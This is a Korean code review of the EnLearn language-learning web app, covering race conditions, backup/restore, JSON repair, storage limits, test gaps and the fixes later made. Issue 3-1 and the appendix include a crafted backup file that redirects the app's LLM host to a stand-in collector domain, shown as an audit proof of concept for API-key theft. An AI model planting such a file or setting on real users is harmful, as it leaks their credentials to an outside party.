# EnLearn 코드 리뷰 (2차)

- 리뷰 일자: 2026-11-11
- 리뷰 대상: `main` @ `6c1c262` (작업 트리 clean) — 1차 리뷰(`docs/CODE_REVIEW.md`) 이후 추가된 **연습 기록 · SRS 복습 · 주간 그래프 · 백업/복원** 중심 + 전체 회귀 점검
- 리뷰 방식: 전체 소스 정독 + `tsc`/`eslint`/`vitest`/`next build`/`npm audit` 실행 + 코퍼스 데이터 실측 + **임시 테스트로 버그 재현 후 파일 삭제**
- 1차 리뷰 15개 항목: 코드·회귀 테스트로 **모두 처리 확인** (HOST 검증, 요청 토큰, `pickEntry` 순위 정렬, 백분위 난이도, 저장 단일화, 타임아웃/취소, 백오프, `max_tokens`, 질문 컨텍스트 창, 시크릿 마스킹, `splitSentences` 선형화, 초기화 UI, 힌트 완화, a11y 시맨틱, CI/typecheck/engines)

## 1. 점검 결과 요약

| 검사 | 결과 |
| --- | --- |
| `npm run typecheck` | ✅ 오류 0 |
| `npm run lint` | ✅ 오류/경고 0 (`scripts/*.mts` 포함) |
| `npm test` | ✅ **17 files / 248 tests** (2.4s) |
| `npm run build` | ✅ 성공 — `/` 정적 prerender 4개 페이지 (Turbopack, Cache Components) |
| `npm audit` | ⚠️ moderate 7 (전부 dev: `typescript-eslint` 계열, `minimatch`) — `npm audit fix`로 해결 가능 |
| 코드 규모 | 9,152줄 (프로덕션 5,261 / 테스트 3,891) — 테스트 비율 43% |
| 코퍼스 | daily 3,000(easy 900/normal 1,350/hard 750, ko 100%) · classics 1,400(420/560/420, ko 0%) · 942KB |

**전체 평가: A-. 1차 리뷰 이후 품질이 뚜렷하게 올랐고(테스트 +138개, CI·빌드·문서 정합성), 방어적 파싱·SRS 로직·저장소 스냅샷 설계는 여전히 우수하다. 다만 백업/복원이라는 새 표면에 보안 경로가 열렸고(연결 설정 무검증 복원), 비동기 경합 가드가 새로운 코드 경로에 일관되게 적용되지 않았으며, 화면 크래시 경로가 재현됐다.**

우선순위: 🔴 사용자 데이터/보안 · 🟠 신뢰성·데이터 정합성 · 🟡 품질·일관성

---

## 2. 잘된 점 (유지할 것)

1. **저장소 스냅샷 계약이 정확하다.** `getPracticeSnapshot`/`getProgressSnapshot`/`getSettingsSnapshot` 모두 "raw 문자열이 바뀔 때만 새 참조"를 반환하고, `storage`(다른 탭) + 자체 이벤트 둘 다 구독하며, SSR 스냅샷은 참조가 일정한 0값이다. 세 곳 모두 테스트로 고정(`practice.test.ts:244`, `corpus.test.ts:255`, `settings.test.ts:75`).
2. **배치 번역 응답을 믿지 않는다.** `parse-batch.ts`는 번호·원문 대조·한국어 존재·너무 짧은 번역 검증을 하고, 대조 실패 항목은 버린다("자리가 이쯤이니" 추측 금지 원칙을 주석으로 남김).
3. **LLM 호출 공통 경로가 견고하다.** 타임아웃 + 취소 + `Retry-After` 존중 재시도 + 추론(reasoning) 전용 응답 차단 + 시크릿 마스킹이 한 곳에 모여 있고, 이를 llm.test.ts 43개로 고정했다.
4. **SRS/통계 로직이 순수 함수로 분리돼 결정론적으로 테스트된다.** 로컬 달력 헬퍼(`localDateString`/`addDays`)로 UTC 함정을 피했고, 연속 연습일·주간 집계·단계 이동이 모두 검증돼 있다.
5. **백업에 API 키를 담지 않는다는 규칙이 코드와 테스트 둘로 방어**돼 있다(`backup.test.ts:79` "⚠️ API 키는 절대 담지 않는다").
6. **XSS 표면이 여전히 거의 없다.** `dangerouslySetInnerHTML` 없음, LLM 출력·코퍼스 원문 전부 텍스트 노드.

---

## 3. 이슈

### 🔴 3-1. 백업 복원이 연결 설정(host/model)을 **무검증으로** 덮어쓴다 — API 키가 제3자 도메인으로 갈 수 있다

`src/lib/backup.ts:130-140`에서 백업 안의 `settings`를 문자열 그대로 받고, `restoreBackup`(`:165-175`)이 `saveSettings({...current, host, model})`로 저장한다. `checkHost()`를 통과하지 않으며, **"지금 기록에 합치기"는 확인 대화도 없다**(`backup-card.tsx:125-128`). 사용자는 "기록을 합쳤다"고 생각했는데 다음 LLM 호출의 대상이 바뀐다.

실측 재현 (임시 테스트로 확인, 파일 삭제함):

```jsonc
// enlearn-backup.json  — 친구에게 받은 파일 / 사이트에서 받은 파일
{ "app": "enlearn", "version": 1,
  "data": { "log": [...], "settings": { "host": "http://collector.example.net/v1", "model": "evil" } } }
```

```
복원 후 loadSettings():
  host = "http://collector.example.net/v1"        # 검증 없이 저장됨
  apiKey = "sk-SECRET-VALUE"                      # 그대로 남아 있음
  checkHost(host) → { ok: true,
                      endpoint: "http://collector.example.net/v1/chat/completions" }
```

1차 리뷰 3-1에서 막은 "키가 앱 밖으로 나간다" 문제가 **백업이라는 새 경로로 재개통**된 것이다. 게다가 `http` 원격 호스트도 그대로 통과하므로 키가 평문으로 전송되고, 프로덕션(https)에서는 mixed-content로 차단돼 오류 원인 파악도 어렵다.

**조치**
```ts
// backup.ts — 받는 순간 검증. 통과하지 못한 settings는 버린다.
const hc = checkHost(String(rawSettings.host));
if (hc.ok) settings = { host: String(rawSettings.host).trim(), model: ..., endpoint: hc.endpoint };
// restoreBackup: settings 복원은 별도 플래그로 분리
export function restoreBackup(file, replace = false, restoreSettings = false)
```
- UI: 합치기/대체 확인창에 **"요청 대상이 `<endpoint>`로 바뀝니다"**를 명시하고, 설정 복원은 별도 체크박스로 둔다.
- `checkHost`에 원격 `http` 경고 추가(`https`가 아니면 "키가 평문으로 전송됩니다" 안내 + 저장 시 확인).

---

### 🔴 3-2. 취소·출처 변경 이후에도 코퍼스 받기가 상태를 반영하고 문장을 "영구 소진"시킨다

`translation-tab.tsx:118-155`의 성공 경로에는 `isCurrent()`/`signal.aborted` 검사 없다(검사는 `catch`/`finally`에만 있다). 게다가 `loadCorpus()`(`corpus.ts:81`)는 `signal`을 받지 않아 **코퍼스 fetch는 취소되지 않는다.**

재현(`fetch`를 지연시킨 뒤 출처를 AI로 변경 = `cancel()` + `requestSeq` 증가):

```
PROBE_H seen=["daily:19:1e4d68t"] shown=true
```

- 이미 취소된 daily 응답이 `setEntry/setKorean/setHints`를 실행 → **AI 모드 화면에 Tatoeba 문장이 뜨고**,
- `markSeen(key)`이 실행돼 그 문장은 **다시 나올 수 없게** 사라진다(사용자는 답도 보기 전에 한 문장을 잃는다).

같은 파일의 평가 경로(`handleEvaluate:217`)는 `stale()`만 보고 `signal.aborted`를 보지 않는다. 반면 `free-writing-tab.tsx:56`·`review-tab.tsx:145,149`는 둘 다 검사한다 — **경합 가드 기준이 세 갈래로 흩어져 있다.** `useCancellable`의 계약도 미묘하다: `cancel()`은 `current.current`를 비우지 않으므로 취소 후에도 `isCurrent() === true`다.

**조치**
1. `loadCorpus(lane, signal?)`로 `fetch(url, { signal })` + 타임아웃(`AbortSignal.timeout(30_000)`).
2. `useCancellable.cancel()`에서 `current.current = null`로 바꿔 취소와 "새 요청으로 대체"를 구분하게 한다(문서화된 계약).
3. 모든 성공 경로를 통일: `if (!isCurrent() || signal.aborted) return;` — `markSeen`/`cacheKorean` 같은 **쓰기 동작은 반드시 이 가드 뒤에서.**
4. 회귀 테스트: 위 PROBE_H를 `translation-tab.test.tsx`에 정식 테스트로 승격("취소·출처 변경 시 문장 기록에 남기지 않는다").

---

### 🟠 3-3. 평가 카드의 "추가 질문" 히스토리가 문장이 바뀌어도 그대로 남는다

`evaluation-card.tsx:68`의 `history`가 result와 무관한 지역 상태이고, 호출부는 `key` 없이 같은 인스턴스를 재사용한다(`translation-tab.tsx:496`, `free-writing-tab.tsx:124`).

재현: 첫 문장에 대해 "왜 과거형인가요?" → 답변 수신 → 새 문장 평가(`result`/`context` 전부 교체) → **이전 Q/A가 새 카드 안에 렌더된 채 발견**

```
AssertionError: expected <p class="font-medium text-indigo-700">Q. 왜 과거형인가요?</p> to be null
```

단순한 표시 문제 이상이다. `askFollowUp(settings, context, result, question, history)`에 **새 문장 컨텍스트 + 옛 문장 히스토리**가 함께 가서, LLM이 다른 문장에 대해 답변하고 사용자는 그것을 지금 문장의 설명으로 읽는다.

**조치**: 결과 식별자를 키로 묶는다.
```tsx
<EvaluationCard
  key={`${evaluated.korean}|${evaluated.english}`}   // 문장+답안 기준
  ... />
```
(카드 안에서 `useEffect(() => setHistory([]), [result])`도 가능하지만, `key`가 실수 가능성이 적다.)

---

### 🟠 3-4. 백업 미리보기가 파일 내용을 그대로 렌더 → 화면 전체 크래시 (error 바운더리 없음)

`backup.ts:113-115`는 `counts`를 `{...} as BackupCounts`로 캐스트만 하고, `backup-card.tsx:119-120`이 그 값을 JSX에 넣는다.

```
counts: { "log": { "nested": 1 }, ... }
→ Error: Objects are not valid as a React child (found: object with keys {nested})
→ unhandled exception (vitest "Uncaught Exception"으로 관측)
```

`src/app/`에 `error.tsx`/`global-error.tsx`가 없으므로 React 트리가 통째로 언마운트된다 — **사용자 입력 한 줄로 앱이 꺼진다.**

**조치**
```ts
const num = (v: unknown): number =>
  typeof v === "number" && Number.isFinite(v) && v >= 0 ? Math.round(v) : 0;
counts: isRecord(o.counts)
  ? { log: num(o.counts.log), srs: num(o.counts.srs), seen: num(o.counts.seen), koreanCache: num(o.counts.koreanCache) }
  : { log: 0, srs: 0, seen: 0, koreanCache: 0 }
```
개수는 파일 값 대신 `data`에서 재계산하는 편이 더 정확하다. 그리고 `src/app/error.tsx`(재시도 버튼)를 추가한다(Next 문서 `01-app/02-guides/production-checklist.md`의 Error Handling 권고).

---

### 🟠 3-5. "🔄 다른 문장" 버튼이 큐의 세 번째 문장부터 영원히 보여주지 않는다

`review-tab.tsx:109-113`의 `loadNext`는 "현재 문장을 뺀 첫 항목"을 고른다. `current` 파생(`:105-106`)이 `currentId`를 못 찾으면 `queue[0]`로 되돌아가기 때문에, 순서가 A→B→A→B로 진동한다.

재현 (복습 대기 3개):
```
PROBE_I_SEQ: ["첫 문장입니다.","두 번째 문장입니다.","첫 문장입니다.","두 번째 문장입니다.","첫 문장입니다."]
```
기존 테스트(`review-tab.test.tsx:145`)는 항목이 2개뿐이라 이 결함을 잡지 못한다.

**조치**: 인덱스를 상태로 갖는다(`skipIndex`) 또는 `queue.find(x => x.id !== current.id)` 대신 순환 인덱스를 쓴다. "다른 문장"을 N번 누르면 N개 전 문장을 볼 수 있어야 한다는 회귀 테스트(항목 3개)를 추가한다.

---

### 🟠 3-6. `repairJson`의 문자열 이스케이프 처리가 죽어 있다 (always-false 비교)

`src/lib/json.ts:23`
```ts
else if (ch === "\\\\") escaped = true;   // ch는 1글자, "\\\\"는 길이 2 문자열 → 절대 true가 아님
```
`"` 앞의 `\`을 추적하지 못해 `inString` 상태가 어긋난다. 후행 쉼/잘린 괄호 복원이 유일한 방어인 파이프라인에서, **따옴표가 섞인 잘린 응답**이 복원에 실패한다:

| 입력 | `repairJson` 결과 | `extractJson` 결과 |
| --- | --- | --- |
| `{"fb": "a \" } b {", "score": 3` | `{"fb": "a \" } b {", "score": 3"}` (잘못된 `"` 추가) | ❌ "LLM 응답을 JSON으로 파싱할 수 없습니다." → 사용자는 "모델이 형식에 맞는 답변을 만들지 못했습니다"만 본다 |
| `{"feedback": "he said \"stop", "score": 5}` | 끝에 `"` 추가 | (직접 파싱은 성공 — 상태만 어긋난다) |

추가로 `\{`, `\(`처럼 LLM이 자주 넣는 **잘못된 이스케이프**는 복원 대상이 아니라 통째로 버려진다(`{"feedback": "Use \{braces\}", "score": 90}` → 파싱 실패).

**조치**: `ch === "\\"`로 고치고(`'\\'`와 동일), `repairJson`에 `\` + 비문법 이스케이프 시 `\` 제거 규칙을 추가한다. 회귀 테스트: 이스케이프된 따옴표가 있는 잘린 JSON 3종.

---

### 🟠 3-7. 코퍼스 빌드의 LLM 재시도 로직이 "재시도하면 안 되는 오류"를 재시도한다

`scripts/build-corpus.mts:418-441`: 재시도 불가능한 상태(400/401)에서 `throw new Error("HTTP ...")`를 하는데, 그 `throw`가 **같은 try의 `catch`에 잡혀** `await sleep(800 * 2 ** attempt)` 후 재시도된다. 결과적으로 잘못된 키로 `--llm`을 돌리면 4번(≈11초 대기) 호출이 나가고, 로그에는 마지막 시도 오류만 남아 **원인(인증 실패)이 화면에 드러나지 않는다.** `src/lib/llm.ts`의 `HttpError.retryable`과 분기가 두 갈래다(주석으로도 인정된 중복).

**조치**: `retryable` 분기를 `throw` 대신 플래그로 처리해 catch 밖에서 결정한다. 장기적으로는 빌드 스크립트가 `checkHost`와 재시도 헬퍼를 공유하게 만든다(`json.ts`처럼 확장자 import를 쓰면 node에서도 가져올 수 있다).

---

### 🟠 3-8. 배치 번역 응답의 "자리(position) 폴백"이 다른 문장의 번역을 붙인다

`parse-batch.ts:89`
```ts
index = found !== undefined ? Number(found) : hasIndex || en ? -1 : position;
```
번호도 원문도 없는 항목은 **자릿수 추측**로 맞춘다. 주석("추측하지 않는다")과 동작이 어긋난다.

재현: 3문장을 요청했는데 모델이 2개만 번호 없이 반환
```
The first sentence is here.  => 첫 번째 문장입니다.
The second sentence is here. => 세 번째 문장입니다.   ← 엉뚱한 번역이 붙고, 그 상태로 translations.json에 영구 캐시된다
```
코퍼스에 잘못 붙은 한국어는 이후 초기화 UI로 지울 때까지 화면에 남는다.

**조치**: 번호/원문 대조 실패 항목은 버리고(`index = -1`), 배치 단위를 잘게 쪼개 다시 시도한다. `parse-batch.test.ts`에 "번호·원문 없는 항목은 폐기" 회귀 테스트 추가.

---

### 🟠 3-9. localStorage 상한·쓰기 실패 처리가 없고, 복원 안내 문구가 실제 저장 개수와 다를 수 있다

- `localStorage.setItem` 호출 10곳(`corpus.ts` 8곳, `practice.ts:79`, `settings.ts:41`) 어디에도 `try/catch`가 없다. `QuotaExceededError`는 클릭 핸들러까지 올라와 UI가 반쯤 적용된 상태(문장은 표시, 기록은 실패)로 남는다.
- 상한 추정(코퍼스 전부를 풀고 400기록·교정 5개를 채운 최악): seen 198KB + srs 327KB + 번역캐시 224KB + 기록 1.92MB ≈ **2.7MB** (한도 ~5MB). 여유는 있지만 srs 큐에는 **개수 상한이 없다**(`addForReview`).
- `importLog`는 저장 후 `slice(-MAX_RECORDS)`로 잘라내지만 **반환값은 잘라내기 전 `incoming.length`**(`practice.ts:673-674, 683-684`). 실측: 500개 복원 → `returned 500, stored 400`. `backup-card`는 이 값으로 "기록 500개 … 합쳤습니다"라고 말하므로 사용자는 100개가 조용히 버려진 줄 모른다.

**조치**: 스토어 쓰기를 래퍼로 감싸 실패 시 한국어 안내(`⚠️ 브라우저 저장 공간이 가득 찼습니다`) + 백업 내보내기 유도. `importLog`는 실제 저장 개수를 반환하고, 상한에 닿았으면 별도로 알린다. srs에도 상한(예: 2,000)을 둔다.

---

### 🟡 3-10. 그 외 일관성/품질

| 위치 | 내용 |
| --- | --- |
| `backup.ts:96` | 버전 검사에 하한이 없다 — `version: 0`, `-5`, `"0"` 모두 받아들여진다(실측: 전부 version 1로 normalized). `version < 1`도 거부해야 한다 |
| `settings-tab.tsx:65-80` | `handleTest`에 취소 버튼·`signal`이 없다. 다른 탭과 달리 120초를 그대로 기다려야 한다(프로바이더 정지 시 체감 최악) |
| `settings.ts:80` `isSettingsComplete` | host를 `checkHost`로 검사하지 않아, 잘못된 host로 모든 탭의 버튼이 켜진 뒤 네트워크 라운드트립이 지나서야 오류가 뜬다 |
| `llm.ts:323` | 오류 응답 `res.text()`를 무제한으로 읽는다. 수 MB 게이트웨이 오류 본문이 메모리에 올라간 뒤 300자로 잘린다(앞부분만 읽는 것이 안전) |
| `llm.ts:82-91` `sanitizeProviderBody` | `Bearer`/`sk-`/`api_key`만 가린다. Azure 스타일 32자리 hex·JWT·Cookie 헤더는 그대로 인쇄된다 |
| `llm.ts:194-205` `anySignal` | 시도마다 `abort` 리스너를 추가하고 해제하지 않는다(누적은 작지만 정리 가능). 시도별 120초 × 3 + 백오프 = 총 6분까지 대기 가능 → **전역 deadline** 권장 |
| `translation-tab.tsx:225` | AI 모드의 기록 id가 `entry?.en ?? finalResult.referenceTranslation` — 즉 **모델이 생성한 참고 번역** 기준이다. 같은 AI 문장을 다시 풀 때마다 id가 바뀌어 기록이 중복되고 `lastAnswerFor`가 놓친다. `practiceId("ai", korean)`처럼 사용자 입력 기준으로 고정해야 한다 |
| `review-tab.tsx:99-106` | 렌더 도중에 `localToday()`/`weeklySeries(8)`/`dueItems()`/`nextReviewDate()`/`lastAnswerFor()`를 호출해 localStorage를 5회 파싱한다. `page.tsx`가 네 탭을 모두 마운트하므로 **설정 탭에서 키를 입력할 때마다** 복습 탭이 재파싱한다. 스냅샷 문자열을 `useMemo` 키로 쓰자 |
| `corpus.ts:330` `koreanCacheCount()` | `getProgressSnapshot`이 lane 없이 호출 → 화면은 동화 캐시 개수처럼 표시하지만 실제로는 전체 카운트(동화만 캐시하므로 우연히 맞다) |
| `corpus-tools.ts:369` | `vocab instanceof Map ? vocab.has(c) : vocab.has(c)` — 분기가 동일. `pickHints`의 `seed`는 유일한 프로덕션 호출부(`build-corpus.mts:655`)에서 항상 기본값 0 → 회전 로직이 사실상 죽어 있다 |
| `corpus-tools.ts:195` `hasVerb` | `/(ing|ed|ed'|s)$/` 때문에 "dogs", "maps"만 있어도 동사가 있다고 본다(필터가 약하다) |
| `corpus-tools.ts:421` `entryKey` | 32비트 FNV-1a + 길이 — 4,400개 기준 충돌 확률 ≈0.2%(실무상 허용, 주석으로 상한 명시 권장) |
| 죽은 export | `corpus.ts:150 isSeen`, `corpus.ts:76 getCachedCorpus`(테스트 전용), `practice.ts:52 daysBetween` — 의도된 테스트 API임을 주석으로 명시하거나 정리 |
| a11y | `tabpanel`에 `tabIndex={0}`이 없어 키보드로 패널 내용을 탐색할 수 없다. `weekly-chart`의 `title` 툴팁은 키보드 접근 불가(`aria-describedby` 또는 스크린리더 텍스트 권장) |
| 보안 헤더 | `next.config.ts`에 헤더가 하나도 없다. `Content-Security-Policy`(report-only로 시작), `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `X-Frame-Options: DENY` 추가 권장 — localStorage의 API 키를 노린 XSS/링크 공격면을 줄인다(문서: `node_modules/next/dist/docs/01-app/02-guides/content-security-policy.md`, `production-checklist.md`) |
| 저장소 관행 | CI에 `npm run build`가 없다(정적 prerender 실패·Next 경계 오류 미검출). `.nvmrc`/`packageManager` 미지정(`engines.node >= 23.6.0`과 CI Node 24 사이 계약 없음). Dependabot/`npm audit` 게이트 없음(dev moderate 7건 미처리). Actions를 SHA로 고정하지 않음 |

---

## 4. 테스트 공백 (부족한 곳)

**커버리지 측정 자체가 없다** — `.gitignore`에 `/coverage`만 있고 `@vitest/coverage-v8` 의존성과 threshold가 없다. 어떤 라인이 안 테스트되는지 알 수 없는 상태.

| 대상 | 현재 | 비어 있는 것 |
| --- | --- | --- |
| `scripts/build-corpus.mts` (727줄) | **테스트 0** | `--lane`/`--per-book` 검증(1차 리뷰에서 고친 코드가 회귀 테스트 없음), `balanceByDifficulty` 비율·상한, `unzipEntries`, `fetchBytes` 재시도, `requestChat`의 재시도 분류(3-7), 번역 캐시 재개(중단 후 이어서) |
| `src/lib/json.ts` | 9 it(JSON 추출/복원) | 이스케이프된 따옴표가 있는 잘린 JSON, 잘못된 이스케이프(`\{`), 중첩 배열 잘림 |
| `src/lib/backup.ts` | 15 it | `counts` 타입 검증(3-4), `settings.host` 검증(3-1), `version` 하한(3-10), huge/중첩 파일, `seen`/`koreanCache` 병합 우선순위(기존 캐시 유지) |
| `translation-tab` | 11 it | **취소·출처 변경 후 지연 응답**(3-2) — 기존 "취소하면 기록에 남기지 않는다"는 fetch가 거부되는 경로만 커버 |
| `evaluation-card` | 6 it | 결과 교체 시 추가 질문 히스토리 초기화(3-3), 취소 후 지연 응답 |
| `review-tab` | 12 it | 큐 3개 이상에서 "다른 문장" 순환(3-5), LLM 채점 중 평점/문장 이동, 자정 경계에서 큐 갱신 |
| `practice.ts` 스토어 | — | `QuotaExceededError` 경로, srs 상한, `importLog` 반환값 = 실제 저장 개수(3-9) |
| `use-cancellable` | 직접 테스트 없음 | `cancel()` 후 `isCurrent()` 계약(현재 true — 문서와 불일치) |
| `weekly-chart` | 직접 테스트 없음 (review-tab 경유만) | `max`가 0인 주, 라벨 포맷, `role="img"` 설명 문자열 |
| 전역 | — | `error.tsx` 바운더리 동작, 라우트 스모크(`next build` 후 HTML 확인) |

권장 추가: `@vitest/coverage-v8` + `coverage.thresholds`(lines 80 / branches 70), CI에 `npm run build`, scripts 대상 `vitest.config.mts` include 확대(`scripts/**/*.test.mts`).

---

## 5. 우선순위 실행 목록

**즉시 (반나절)**
1. 백업 `settings` 검증 + 복원 확인 분리 + 원격 `http` 경고 (3-1)
2. `loadCorpus(lane, signal)` + 성공 경로 전체에 `isCurrent()/signal.aborted` 가드, `markSeen`을 가드 뒤로 (3-2)
3. `EvaluationCard`에 `key` 부여로 추가 질문 히스토리 격리 (3-3)
4. `counts` 숫자 정규화 + `src/app/error.tsx` 추가 (3-4)

**이번 주**
5. "다른 문장" 순환 인덱스 + 항목 3개 회귀 테스트 (3-5)
6. `repairJson` 이스케이프 버그 수정 + 잘못된 이스케이프 복원 + 테스트 3종 (3-6)
7. `parseTranslationBatch` position 폴백 제거 (3-8)
8. 스토어 쓰기 래퍼(QuotaExceeded 처리) + `importLog` 실제 저장 개수 반환 + srs 상한 (3-9)
9. `handleTest` 취소 가능화, `isSettingsComplete`에 host 검증, 오류 본문 읽기 상한 (3-10)

**개선**
10. `scripts/build-corpus.mts` 단위 테스트 골격(파서·밸런싱·재시도 분류)과 `requestChat` 재시도 분류 수정 (3-7)
11. `useCancellable` 계약 명확화(`cancel()` 시 `current.current = null`)와 전역 deadline
12. ReviewTab 렌더 파생을 `useMemo`(snapshot 키)로 정리, 죽은 export 정리, a11y `tabpanel tabIndex`
13. CSP·보안 헤더, CI에 `npm run build`·coverage·audit, `.nvmrc`/`packageManager`, Dependabot, dev advisory 정리

---

## 6. 부록 — 실측 근거

```
# 정적 검증
npm run typecheck : 통과           npm run lint : 통과 (scripts 포함)
npm test          : 17 files / 248 tests (2.4s)
npm run build     : 통과 (Next 16.4.2 / Turbopack, Cache Components, 정적 4페이지)
npm audit         : moderate 7 (dev 전용: @typescript-eslint/*, minimatch, typescript-eslint)

# 3-1 백업 → 연결 설정 (임시 테스트)
restoreBackup(parseBackup(crafted), replace=false) → { settingsRestored: true }
loadSettings().host = "http://collector.example.net/v1", apiKey = "sk-SECRET-VALUE" 유지
checkHost(host) → endpoint "http://collector.example.net/v1/chat/completions"

# 3-2 코퍼스 경합 (fetch 지연 + 출처 변경)
PROBE_H seen=["daily:19:1e4d68t"] shown=true

# 3-3 평가 카드 히스토리
rerender(새 result) 후에도 `Q. 왜 과거형인가요?` 노드가 발견됨 (AssertionError)

# 3-4 백업 counts
counts.log = {"nested":1} → "Objects are not valid as a React child" (Uncaught Exception)

# 3-5 다른 문장 순환 (대기 3개)
["첫","두","첫","두","첫"]   ← 세 번째 문장 미노출

# 3-6 repairJson
IN : {"fb": "a \" } b {", "score": 3
REP: {"fb": "a \" } b {", "score": 3"}      ← 잘못된 '"' 추가
OUT: ERROR (복원 실패)

# 3-8 배치 번역 position 폴백
"The second sentence is here." => "세 번째 문장입니다."

# 3-9 상한/안내
importLog(500 items, replace=true) → returned 500, stored 400
localStorage.setItem 호출 10곳 전부 try/catch 없음

# 백업 version 하한
version 0 / -5 / "0" → 모두 허용(normalized version 1)

# 코퍼스 / 저장소 크기
daily.json 615KB(3,000) classics.json 327KB(1,400)
localStorage 예상 최대 ≈ 2.7MB / 한도 ~5MB
```

> 재현에 쓴 임시 테스트(`zz-probe*`)는 리포트 작성 후 삭제했다. 위 출력은 그대로 회귀 테스트로 옮길 수 있다.

---

## 7. 처리 결과 (2차 리뷰 반영)

판단은 전부 **코드를 직접 읽거나 재현**해서 정했다. 커밋마다 회귀 테스트를 함께 넣었고,
"조치 없음"은 이유를 적었다. 검증 기준: `npx tsc --noEmit` · `npm run lint` · `npm test` · `npm run build`.

| 항목 | 판단 | 조치 | 커밋 |
| --- | --- | --- | --- |
| 3-1 백업이 연결 설정을 무검증으로 덮어쓴다 | **타당** | `parseBackup`이 `checkHost`로 검증(실패시 settings 전부 폐기) + normalized `endpoint` 기록, `restoreBackup(file, replace, restoreSettings=false)` 기본값 off, 원격 `http`는 `hostWarning`으로 경고 UI | `de4ed54` |
| 3-2 취소·출처 변경 후 코퍼스 받기 경합 | **타당** | `loadCorpus(lane, signal?)`(호출자 단위 취소·30초 타임아웃·공유 요청은 보호), 쓰기를 가드 뒤로 이동, 경합 가드를 `stale() || signal.aborted` 한 가지 규칙으로 통일, `cancel()` 후 `isCurrent()` false 계약 | `54cbe05` |
| 3-3 추가 질문 히스토리 누수 | **부분 타당** | 카드를 재사용하면 실제로 새지만(카드 단위 재현 확인), **탭 경로에서는 재평가 중 `!loading` 때문에 카드가 언마운트돼 우연히 초기화**됐다 → 카드 자체에서 result 교체 시 히스토리 폐기, 늦게 도착한 답변 폐기, 호출부는 `key`로 명시적으로 재마운트 | `246c329` |
| 3-4 백업 미리보기가 파일 값을 그대로 렌더 | **타당** | `countsOf(data)`로 개수를 항상 재계산(파일 값은 UI에 도달하지 않음) + `src/app/error.tsx` 바운더리 | `de4ed54` |
| 3-5 "다른 문장"이 두 개만 순환 | **타당** | 큐 인덱스 순환으로 변경 (순환을 되돌리면 테스트가 실패하는 것까지 확인) | `75c5465` |
| 3-6 `repairJson` 이스케이프 분기 죽음 | **타당** | 한 글자 비교로 수정 + JSON에서 무효한 이스케이프(`\{ \} \[ \'`) 정리. 이전 코드로 되돌리면 4건 실패 | `1645eb9` |
| 3-7 빌드의 재시도 분류 | **타당** | `requestChatOnce`가 예외 대신 `{ok, retryable, retryAfterMs, message}` 반환, 400/401/404는 즉시 중단 + 안내 문구 | `1645eb9` |
| 3-8 배치 번역 position 폴백 | **타당** | 식별자가 하나도 없는 **완전한 목록(개수 일치)**일 때만 자릿수 대응. 부분 응답의 번호 없는 항목은 폐기 | `75c5465` |
| 3-9 저장소 상한·쓰기 실패·개수 불일치 | **타당** | `src/lib/storage.ts`(safeSetItem + 안내), 10개 쓰기 전부 래퍼 경유, `MAX_SRS 500`/`MAX_SEEN 20_000`/`MAX_KOREAN_CACHE 4_000` + 번역 값 길이 제한, 가져오기 반환값 = 저장 후 실제 개수, `storage-warning` UI | `946b09b` |
| 3-10 version 하한 | **타당** | `version < 1`(0·음수·"0") 거부 | `de4ed54` |
| 3-10 `handleTest` 취소 불가 | **타당** | `useCancellable` + 취소 버튼, 취소는 오류로 표시하지 않고 "테스트 중…"에서 탈출 | 예정 커밋 |
| 3-10 `isSettingsComplete` host 미검증 | **타당** | `checkHost`로 검증. 검증 코드는 `src/lib/host.ts`로 분리(llm mock에 의존하지 않게 하고 llm은 재export) | 예정 커밋 |
| 3-10 오류 본문 무제한 읽기 | **타당** | 두 지점 모두 500자로 제한(이미 `sanitizeProviderBody`가 300자로 정리하지만 메모리에 먼저 올리는 문제) | 예정 커밋 |
| 3-10 `sanitizeProviderBody` 마스킹 구멍 | **타당** | Azure식 32자리 hex, JWT, `Set-Cookie` 추가 | 예정 커밋 |
| 3-10 `anySignal` 리스너 정리 | **타당** | abort 시 리스너 해제. 추가로 **전체 대기 예산**(`LLM_TOTAL_BUDGET_MS` 240초) 도입 — 시도별 120초×3+백오프로 6분까지 늘어난 것을 막는다 | 예정 커밋 |
| 3-10 AI 모드 기록 id가 모델 출력 기준 | **타당** | `PracticeInput.anchor` 추가, AI 문장은 화면의 한국어 기준 → 같은 문장 재연습 시 기록 중복 해소(수정 전 2건 → 후 1건) | 예정 커밋 |
| 3-10 복습 탭의 렌더 중 localStorage 5회 파싱 | **타당** | `useMemo([snapshot])`로 묶음(스냅샷 참조는 저장소가 안 바뀌면 안정적) | 예정 커밋 |
| 3-10 `koreanCacheCount` lane 없이 호출 | **부분 타당** | 화면 어디에서도 이 함수를 쓰지 않았다(리뷰의 지적이 의도한 경로 없음). lane 인자를 추가하고 "classic만 캐시하므로 우연히 일치"임을 주석으로 명시 | 예정 커밋 |
| 3-10 `lemma`의 동일 분기 | **타당** | 분기 제거 | 예정 커밋 |
| 3-10 `pickHints`의 seed 미사용 | **인정(방치)** | 회전 로직을 실제로 돌아가게 하려면 문장별 seed 전략이 필요하다. 힌트 품질에는 영향 없음 → 현상 유지, 주석으로 기록 | — |
| 3-10 `hasVerb` 정규식이 약하다 | **인정(방치)** | 난이도 판정만 바꾸는 문제. 재생성 없이 손대면 코퍼스 등급이 흔들린다 → 현 코퍼스에서 재현되는 값으로 유지 | — |
| 3-10 `entryKey` 32비트 해시 충돌 | **인정(허용)** | 4,400개 기준 ≈0.2%. 키는 로컬 캐시 key일 뿐이며 충돌 시 한 문장이 겹쳐 보이지 않는다 | — |
| 3-10 죽은 export | **부분 타당** | `isSeen`·`getCachedCorpus`·`daysBetween`은 테스트/내부에서 실제로 쓰인다 → 제거 대신 용도를 주석으로 명시 | 예정 커밋 |
| 3-10 a11y: tabpanel tabIndex | **타당** | `tabIndex={0}` 추가 + 테스트 | 예정 커밋 |
| 3-10 a11y: 주간 그래프 툴팁 | **타당** | 주별 항목을 focus 가능하게 하고 같은 내용을 `aria-label`로 제공(그래프 전체 설명은 기존부터 `role="img"`) | 예정 커밋 |
| 3-10 보안 헤더 | **부분 조치** | `nosniff`/`X-Frame-Options: DENY`/`Referrer-Policy`/`Permissions-Policy` 추가. **CSP는 넣지 않았다** — Next의 CSP는 nonce 중계가 필요하고, 정적 호스팅에서는 헤더 자체가 적용되지 않는다(CSP는 호스팅 환경에서 report-only로 시작하는 것이 맞다) | 예정 커밋 |
